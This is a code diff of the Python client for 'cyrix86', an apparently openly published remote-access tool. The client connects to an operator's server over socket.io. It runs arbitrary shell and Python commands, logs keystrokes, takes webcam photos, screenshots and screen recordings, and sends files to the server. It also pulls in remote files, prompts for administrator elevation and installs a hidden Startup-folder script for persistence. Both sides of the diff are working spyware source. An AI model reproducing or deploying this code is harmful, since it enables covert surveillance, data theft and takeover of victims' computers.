@@ -1,5 +1,5 @@
 """
-Created by: Madhanmaaz
+Author: Madhanmaaz
 Github: https://github.com/madhanmaaz/cyrix86-module
 Website: https://madhanmaaz.netlify.app
 Description: cyrix86 client app using socket.io
@@ -7,6 +7,7 @@ Description: cyrix86 client app using socket.io
 
 import subprocess
 import mss.tools
+import winsound
 import keyboard
 import socketio
 import requests
@@ -20,16 +21,12 @@ import mss
 import sys
 import os
 
-ORIGIN, options = base64.b64decode(sys.argv[1]).decode().split("/p?")
+ORIGIN, options = base64.b64decode(sys.argv[1]).decode().split("@@")
 
 options = options.split("-")
-P_APP = options[0] == "1"
 STARTUP = options[1] == "1"
 UAC = options[2] == "1"
-
-USER_DOMAIN = os.environ.get("USERDOMAIN", "UNKNOWN")
-USER_NAME = os.environ.get("USERNAME", "UNKNOWN")
-ID = f"{USER_DOMAIN}-{USER_NAME}"
+ID = f"{os.environ['USERDOMAIN']}-{os.environ['USERNAME']}"
 
 if ctypes.windll.shell32.IsUserAnAdmin():
     ID = ID + '-UAC'
@@ -39,75 +36,69 @@ BASE_FOLDER_NAME = os.path.dirname(sys.executable).split("\\")[-1]
 TEMP = os.environ.get("TEMP", os.environ.get("APPDATA", "UNKNOWN"))
 SIO = socketio.Client()
 
-
 def randomString(length):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
-
 
 def getFileName(ext):
     timeStamp = time.strftime("%Y-%m-%d-%H-%M-%S")
     return os.path.join(TEMP, f"{timeStamp}-{randomString(5)}.{ext}")
 
-
 def _exit():
-    SIO.disconnect()
     os._exit(0)
-
 
 def toServer(data):
     if not SIO.connected: return
     SIO.emit("to-server", data)
 
+def pipInstall(t, args):
+    Python({
+        "type": t,
+        "app": "pip",
+        "args": args
+    })
+
+def postFile(t, filePath):
+    requests.post(f"{ORIGIN}/client", files={"file": open(filePath, "rb")}, data={"id": ID,"type": t})
 
 class Terminal:
     def __init__(self, options):
         self.type = options.get("type")
         self.app = options.get("app")
         self.value = options.get("value")
-
-        try:
-            if self.value[0:3] == "cd ":
-                self.changeDirectory()
-            else:
-                toServer({
-                    "type": self.type,
-                    "output": self.terminal()
-                })
-        except Exception as e:
-            toServer({
-                "type": self.type,
-                "output": f"ERROR: {e}"
-            })
-            
-
-    def terminal(self):
-        if self.app != "cmd": self.value = f"powershell {self.value}"
-
-        result = subprocess.run(
-            self.value, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
-        )
-
-        if result.returncode == 0: return result.stdout
-        else: return result.stderr
-
-
-    def changeDirectory(self):
+        
+        if self.value[0:3] == "cd ":
+            self.chdir()
+        else:
+            self.run()
+    
+    def chdir(self):
         os.chdir(self.value[3:])
         toServer({
             "type": self.type,
             "output": f"Current Directory: {os.getcwd()}",
             "cwd": os.getcwd()
         })
+    
+    def run(self):
+        if self.app != "cmd": 
+            self.value = f"{self.app} {self.value}"
 
+        result = subprocess.run(
+            self.value, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
+        )
 
+        toServer({
+            "type": self.type,
+            "output": result.stdout if result.returncode == 0 else result.stderr
+        })
+    
 class Webcam:
     def __init__(self, options):
         self.type = options.get("type")
         self.deviceIndex = int(options.get("deviceIndex"))
 
         self.snapshot()
-
-
+    
     def snapshot(self):
         try:
             import cv2
@@ -117,73 +108,56 @@ class Webcam:
                 "output": "Please wait, installing dependencies..."
             })
 
-            return Python({
-                "type": self.type,
-                "app": "pip",
-                "args": "install opencv-python"
-            })
-
-        try:
-            device = cv2.VideoCapture(self.deviceIndex, cv2.CAP_DSHOW)
+            return pipInstall(self.type, "install opencv-python")
         
-            if not device.isOpened():
-                return toServer({
-                    "type": self.type,
-                    "output": "Failed to open. webcam not found?"
-                })
-
-            time.sleep(0.5)
-            ret, frame = device.read()
-            device.release()
-            if not ret:
-                return toServer({
-                    "type": self.type,
-                    "output": "Failed to capture frame"
-                })
-            
-            filename = getFileName("jpg")
-            cv2.imwrite(filename, frame)
-            requests.post(f"{ORIGIN}/client", files={"file": open(filename, "rb")}, data={"id": ID,"type": self.type})
-            os.remove(filename)
-        except Exception as e:
-            toServer({
+        device = cv2.VideoCapture(self.deviceIndex, cv2.CAP_DSHOW)
+        if not device.isOpened():
+            return toServer({
                 "type": self.type,
-                "output": f"ERROR: {e}"
+                "output": "Failed to open. webcam not found?"
             })
+        
+        time.sleep(0.5)
+        ret, frame = device.read()
+        device.release()
+        if not ret:
+            return toServer({
+                "type": self.type,
+                "output": "Failed to capture frame"
+            })
+        
+        filename = getFileName("jpg")
+        cv2.imwrite(filename, frame)
+        postFile(self.type, filename)
+        os.remove(filename)
 
-
+DISPLAY_IS_RECORDING = False
 class Display:
     def __init__(self, options):
         self.type = options.get("type")
         self.action = options.get("action")
         self.deviceIndex = int(options.get("deviceIndex"))
         self.duration = int(options.get("duration"))
-        self.count = int(options.get("count"))
 
-        for _ in range(self.count):
-            if self.action == "snapshot":
-                self.snapshot()
-            elif self.action == "record":
+        if self.action == "snapshot":
+            self.snapshot()
+        elif self.action == "record":
+            if  DISPLAY_IS_RECORDING == False:
                 self.record()
-            
-            time.sleep(1)
-
-
+            else:
+                toServer({
+                    "type": self.type,
+                    "output": "Display is already recording"
+                })
+    
     def snapshot(self):
-        try:
-            filename = getFileName("jpg")
-            with mss.mss() as sct:
-                monitor = sct.grab(sct.monitors[self.deviceIndex])
-                mss.tools.to_png(monitor.rgb, monitor.size, output=filename)
-                requests.post(f"{ORIGIN}/client", files={"file": open(filename, "rb")}, data={"id": ID,"type": self.type})
-                os.remove(filename)
-        except Exception as e:
-            toServer({
-                "type": self.type,
-                "output": f"ERROR: {e}"
-            })
-
-
+        filename = getFileName("jpg")
+        with mss.mss() as sct:
+            monitor = sct.grab(sct.monitors[self.deviceIndex])
+            mss.tools.to_png(monitor.rgb, monitor.size, output=filename)
+            postFile(self.type, filename)
+            os.remove(filename)
+    
     def record(self):
         try:
             import av
@@ -194,50 +168,42 @@ class Display:
                 "output": "Please wait, installing dependencies..."
             })
 
-            return Python({
-                "type": self.type,
-                "app": "pip",
-                "args": "install av numpy"
-            })
+            return pipInstall(self.type, "install av numpy")
         
-        try:
-            filename = getFileName("mp4")
-            sct = mss.mss()
-            monitor = sct.monitors[self.deviceIndex]
-            width = monitor.get("width")
-            height = monitor.get("height")
-            output = av.open(filename, mode='w')
-            stream = output.add_stream('libx264', rate=15)
-            stream.width = width
-            stream.height = height
-            stream.pix_fmt = 'yuv420p'
-            stream.options = {
-                'crf': '35',
-                'preset': 'ultrafast',
-                'tune': 'zerolatency'
-            }
+        global DISPLAY_IS_RECORDING
+        DISPLAY_IS_RECORDING = True
+        filename = getFileName("mp4")
+        sct = mss.mss()
+        monitor = sct.monitors[self.deviceIndex]
+        width = monitor.get("width")
+        height = monitor.get("height")
+        output = av.open(filename, mode='w')
+        stream = output.add_stream('libx264', rate=15)
+        stream.width = width
+        stream.height = height
+        stream.pix_fmt = 'yuv420p'
+        stream.options = {
+            'crf': '35',
+            'preset': 'ultrafast',
+            'tune': 'zerolatency'
+        }
 
-            FPS = 15
-            for _ in range((self.duration + 2) * FPS): # duration * fps
-                img = np.array(sct.grab(monitor))
-                frame = av.VideoFrame.from_ndarray(img, format='bgra')
-                frame = frame.reformat(format='yuv420p', width=width, height=height)
-                for packet in stream.encode(frame):
-                    output.mux(packet)
-                time.sleep(1 / FPS)
-            
-            for packet in stream.encode():
+        FPS = 15
+        for _ in range((self.duration + 2) * FPS):
+            img = np.array(sct.grab(monitor))
+            frame = av.VideoFrame.from_ndarray(img, format='bgra')
+            frame = frame.reformat(format='yuv420p', width=width, height=height)
+            for packet in stream.encode(frame):
                 output.mux(packet)
+            time.sleep(1 / FPS)
 
-            output.close()
-            requests.post(f"{ORIGIN}/client", files={"file": open(filename, "rb")}, data={"id": ID,"type": self.type})
-            os.remove(filename)
-        except Exception as e:
-            toServer({
-                "type": self.type,
-                "output": f"ERROR: {e}"
-            })
-
+        for packet in stream.encode():
+            output.mux(packet)
+        
+        output.close()
+        DISPLAY_IS_RECORDING = False
+        postFile(self.type, filename)
+        os.remove(filename)
 
 class Sound:
     def __init__(self, options):
@@ -247,25 +213,17 @@ class Sound:
         self.play()
     
     def play(self):
-        try:
-            import winsound
-            if not os.path.exists(self.filePath):
-                return toServer({
-                    "type": self.type,
-                    "output": f"ERROR: File not found: {self.filePath}"
-                })
-            
-            winsound.PlaySound(self.filePath, winsound.SND_FILENAME | winsound.SND_ASYNC)
-            toServer({
+        if not os.path.exists(self.filePath):
+            return toServer({
                 "type": self.type,
-                "output": f"Playing: {self.filePath}"
+                "output": f"ERROR: File not found: {self.filePath}"
             })
-        except Exception as e:
-            toServer({
-                "type": self.type,
-                "output": f"ERROR: {e}"
-            })
-
+        
+        winsound.PlaySound(self.filePath, winsound.SND_FILENAME | winsound.SND_ASYNC)
+        toServer({
+            "type": self.type,
+            "output": f"Playing: {self.filePath}"
+        })
 
 class Notifications:
     def __init__(self, options):
@@ -278,51 +236,13 @@ class Notifications:
 
         if self.action == "messagebox":
             self.messagebox()
-        elif self.action == "toast":
-            self.toast()
-    
-    def messagebox(self):
-        try:
-            toServer({
-                "type": self.type,
-                "output": f"Messagebox opened successfully"
-            })
-            ctypes.windll.user32.MessageBoxW(0, self.title, self.message, self.buttons | self.icon)
-        except Exception as e:
-            toServer({
-                "type": self.type,
-                "output": f"ERROR: {e}"
-            })
-
-
-    def toast(self):
-        try:
-            import win10toast
-        except ImportError:
-            toServer({
-                "type": self.type,
-                "output": "Please wait, installing dependencies..."
-            })
-
-            return Python({
-                "type": self.type,
-                "app": "pip",
-                "args": "install win10toast"
-            })
         
-        try:
-            toaster = win10toast.ToastNotifier()
-            toaster.show_toast(title=self.title, msg=self.message, duration=10, threaded=True)
-            toServer({
-                "type": self.type,
-                "output": f"Toast opened successfully"
-            })
-        except Exception as e:
-            toServer({
-                "type": self.type,
-                "output": f"ERROR: {e}"
-            })
-
+    def messagebox(self):
+        toServer({
+            "type": self.type,
+            "output": f"Messagebox opened successfully"
+        })
+        ctypes.windll.user32.MessageBoxW(0, self.title, self.message, self.buttons | self.icon)
 
 KEYBOARD_STATE = False
 class Keyboard:
@@ -331,15 +251,15 @@ class Keyboard:
         self.type = options.get("type")
         self.action = options.get("action")
 
-        output = f"Keyboard state: {KEYBOARD_STATE}"
+        output = f"KEYBOARD_STATE: {KEYBOARD_STATE}"
         if self.action == "start" and KEYBOARD_STATE == False:
             KEYBOARD_STATE = True
-            self.start()
+            keyboard.hook(self.callback)
             output = "Keyboard started"
             
         elif self.action == "stop" and KEYBOARD_STATE:
             KEYBOARD_STATE = False
-            self.stop()
+            keyboard.unhook_all()
             output = "Keyboard stopped"
 
         toServer({
@@ -347,15 +267,6 @@ class Keyboard:
             "output": output
         })
     
-
-    def start(self):
-        keyboard.hook(self.callback)
-
-
-    def stop(self):
-        keyboard.unhook_all()
-    
-
     def callback(self, event):
         if event.event_type == keyboard.KEY_DOWN:
             toServer({
@@ -363,119 +274,87 @@ class Keyboard:
                 "output": event.name
             })
 
-
 class FileManager:
     def __init__(self, options):
         self.type = options.get("type")
         self.action = options.get("action")
         self.value = options.get("value")
 
-        if self.action == "cwd":
-            self.cwd()
-        elif self.action == "list":
-            self.list()
+        if self.action == "goto":
+            self.goto()
         elif self.action == "upload":
             self.upload()
         elif self.action == "download":
             self.download()
-
-
-    def cwd(self):
-        try:
-            os.chdir(self.value)
-            toServer({
+    
+    def goto(self):
+        if not os.path.exists(self.value):
+            return toServer({
                 "type": self.type,
-                "output": f"Current Directory: {os.getcwd()}",
-                "cwd": os.getcwd()
+                "output": f"ERROR: Directory not found"
             })
-        except Exception as e:
+        
+        os.chdir(self.value)
+        cwd = os.getcwd()
+        toServer({
+            "type": self.type,
+            "output": self.listDir(cwd),
+            "cwd": cwd
+        })
+    
+    def upload(self):
+        filename = self.value.split("@")[0]
+        url = ''.join(self.value.split("@")[1:])
+        response = requests.get(url, headers={
+            "User-Agent": USERAGENT
+        })
+
+        if response.status_code == 200:
+            with open(filename, "wb") as f:
+                f.write(response.content)
             toServer({
                 "type": self.type,
-                "output": f"ERROR: {e}"
+                "output": f"File uploaded successfully"
+            })
+        else:
+            toServer({
+                "type": self.type,
+                "output": f"ERROR: Failed to upload file"
             })
     
-    def list(self): 
-        try:
-            files = []
-            parent = self.value or os.getcwd()
-            for fileName in os.listdir(parent):
-                fullPath = os.path.join(parent, fileName)
-
-                if os.path.isfile(fullPath):
-                    files.append({
-                        "name": fileName,
-                        "type": "file",
-                    })
-                elif os.path.isdir(fullPath):
-                    files.append({
-                        "name": fileName,
-                        "type": "folder"
-                    })
-
-            toServer({
-                "type": self.type,
-                "output": json.dumps(files),
-                "parent": parent
-            })
-        except Exception as e:
-            toServer({
-                "type": self.type,
-                "output": f"ERROR: {e}"
-            })
-
-
-    def upload(self):
-        try:
-            response = requests.get(self.value, headers={
-                "User-Agent": USERAGENT
-            })
-
-            if response.status_code == 200:
-                filename = self.value.split("/")[-1]
-                filePath = os.path.join(os.getcwd(), filename)
-                with open(filePath, "wb") as f:
-                    f.write(response.content)
-
-                toServer({
-                    "type": self.type,
-                    "output": f"File uploaded successfully"
-                })
-            else:
-                toServer({
-                    "type": self.type,
-                    "output": f"ERROR: File not found"
-                })
-        except Exception as e:
-            toServer({
-                "type": self.type,
-                "output": f"ERROR: {e}"
-            })
-
     def download(self):
-        try:
-            if not os.path.exists(self.value):
-                return toServer({
-                    "type": self.type,
-                    "output": f"ERROR: File not found"
-                })
-            
-            response = requests.post(f"{ORIGIN}/client", files={"file": open(self.value, "rb")}, data={"id": ID,"type": self.type})
-            if response.status_code == 200:
-                toServer({
-                    "type": self.type,
-                    "output": f"File downloaded successfully"
-                })
-            else:
-                toServer({
-                    "type": self.type,
-                    "output": f"ERROR: Failed to download file"
-                })
-        except Exception as e:
+        fullPath = os.path.join(os.getcwd(), self.value)
+        if not os.path.exists(fullPath):
+            return toServer({
+                "type": self.type,
+                "output": f"ERROR: File or directory not found"
+            })
+        
+        if os.path.isdir(fullPath):
+            os.chdir(fullPath)
             toServer({
                 "type": self.type,
-                "output": f"ERROR: {e}"
+                "output": self.listDir(fullPath),
+                "cwd": os.getcwd()
             })
-
+        else:
+            postFile(self.type, fullPath)
+    
+    def listDir(self, path): 
+        files = []
+        folders = []
+        try:
+            for fileName in os.listdir(path):
+                fullPath = os.path.join(path, fileName)
+                if os.path.isfile(fullPath): 
+                    files.append(fileName)
+                elif os.path.isdir(fullPath): 
+                    folders.append(fileName)
+        except: pass
+        return json.dumps({
+            "files": files,
+            "folders": folders
+        })
 
 class Python:
     def __init__(self, options):
@@ -486,54 +365,33 @@ class Python:
 
         if self.app == "python":
             self.run()
-
         elif self.app == "pip":
             self.pip()
-
-
-    def run(self): 
-        try:
-            filename = getFileName("py")
-            with open(filename, "w") as f:
-                f.write(self.code)
-
-            result = subprocess.run(f'"{sys.executable}" "{filename}"', shell=True, text=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-            output = result.stdout
-            if result.returncode != 0: output = result.stderr
-            toServer({
-                "type": self.type,
-                "output": output
-            })
-            os.remove(filename)
-        except Exception as e:
-            toServer({
-                "type": self.type,
-                "output": f"ERROR: {e}"
-            })
-
-
+    
+    def run(self):
+        filename = getFileName("py")
+        with open(filename, "w") as f:
+            f.write(self.code)
+        result = subprocess.run(f'"{sys.executable}" "{filename}"', shell=True, text=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+        toServer({
+            "type": self.type,
+            "output": result.stdout if result.returncode == 0 else result.stderr
+        })
+        os.remove(filename)
+        
     def pip(self):
-        try:
-            if not self.args: return
-            pipPath = os.path.join(os.path.dirname(sys.executable), "Scripts", "pip.exe")
-            toServer({
-                "type": self.type,
-                "output": f"Running pip {self.args}"
-            })
+        if not self.args: return
+        pipPath = os.path.join(os.path.dirname(sys.executable), "Scripts", "pip.exe")
+        toServer({
+            "type": self.type,
+            "output": f"Running pip {self.args}"
+        })
 
-            result = subprocess.run(f'"{pipPath}" {self.args}', shell=True, text=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-
-            output = result.stdout
-            if result.returncode != 0: output = result.stderr
-            toServer({
-                "type": self.type,
-                "output": output
-            })
-        except Exception as e:
-            toServer({
-                "type": self.type,
-                "output": f"ERROR: {e}"
-            })
+        result = subprocess.run(f'"{pipPath}" {self.args}', shell=True, text=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+        toServer({
+            "type": self.type,
+            "output": result.stdout if result.returncode == 0 else result.stderr
+        })
 
 class Others:
     def __init__(self, options):
@@ -546,78 +404,28 @@ class Others:
             self.startup()
         elif self.action == "exit":
             self.exit()
-
-
+    
     def uac(self):
-        try:
-            if not ctypes.windll.shell32.IsUserAnAdmin():
-                res = ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, f'"{sys.argv[0]}" {sys.argv[1]}', None, 0)
-                if res == 42:
-                    toServer({
-                        "type": self.type,
-                        "output": f"UAC request is accepted. Now opening a new instance with new ID: {ID}-UAC"
-                    })
-                    time.sleep(1)
-                    _exit()
-                else:
-                    toServer({
-                        "type": self.type,
-                        "output": "UAC request is denied"
-                    })
-            else:
-                toServer({
-                    "type": self.type,
-                    "output": "UAC is already enabled"
-                })
-        except Exception as e:
+        if not ctypes.windll.shell32.IsUserAnAdmin():
+            res = ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, f'"{sys.argv[0]}" {sys.argv[1]}', None, 0)
             toServer({
                 "type": self.type,
-                "output": f"ERROR: {e}"
+                "output": f"UAC request is accepted. New ID: {ID}-UAC" if res == 42 else "UAC request is denied"
             })
-
-
+            if res == 42: _exit()
+                
     def startup(self):
-        try:
-            startupFile = os.path.join(
-                os.environ["APPDATA"],
-                "Microsoft",
-                "Windows",
-                "Start Menu",
-                "Programs",
-                "Startup",
-                f"System.vbs",
-            )
-
-            with open(startupFile, "w",) as f:
-                f.write(f'''' python installer
+        startupFile = os.path.join(os.environ["APPDATA"],"Microsoft","Windows","Start Menu","Programs","Startup","System.vbs")
+        with open(startupFile, "w",) as f:
+            f.write(f'''' python installer
 CreateObject("WScript.Shell").run "cmd /c ""cd %APPDATA%\\{BASE_FOLDER_NAME} & python -m cyrix86 {sys.argv[1]}""", 0''')
-            
-            if os.path.exists(startupFile):
-                toServer({
-                    "type": self.type,
-                    "output": f"Startup file created successfully"
-                })
-            else:
-                toServer({
-                    "type": self.type,
-                    "output": f"Startup file creation failed"
-                })
-        except Exception as e:
-            toServer({
-                "type": self.type,
-                "output": f"ERROR: {e}"
-            })
-
+        toServer({
+            "type": self.type,
+            "output": f"Startup file created successfully" if os.path.exists(startupFile) else f"Startup file creation failed"
+        })
 
     def exit(self):
-        try:
-            _exit()
-        except Exception as e:
-            toServer({
-                "type": self.type,
-                "output": f"ERROR: {e}"
-            })
-
+        _exit()
 
 HANDLER_MAP = {
     "terminal": Terminal,
@@ -633,30 +441,31 @@ HANDLER_MAP = {
 
 @SIO.on("connect")
 def onConnect():
-    doneFile = os.path.join(os.environ.get("APPDATA"), "pythonDone")
-    if not os.path.exists(doneFile):
-        os.mkdir(doneFile)
-
+    a = os.path.join(os.environ.get("APPDATA"), "hasPython")
+    if not os.path.exists(a):
+        os.mkdir(a)
     SIO.emit("to-server", {
         "type": "terminal",
         "output": f"Current Directory: {os.getcwd()}",
         "cwd": os.getcwd()
     })
 
-
 @SIO.on("disconnect")
 def onDisconnect():
     pass
 
-
 @SIO.on("receiver")
 def onReceiver(data):
-    HANDLER_MAP.get(data.get("type"))(data)
-
+    try: HANDLER_MAP.get(data.get("type"))(data)
+    except Exception as e: 
+        toServer({
+            "type": data.get("type"),
+            "output": f"ERROR: {e}"
+        })
 
 def main():
-    if STARTUP: Others({"type": "startup"})
-    if UAC: Others({"type": "uac"})
+    if STARTUP: Others({"type": "others", "action": "startup"})
+    if UAC: Others({"type": "others", "action": "uac"})
 
     while True:
         try:
@@ -668,7 +477,6 @@ def main():
             break
         except:
             time.sleep(4)
-
 
 if __name__ == "__main__":
     main()
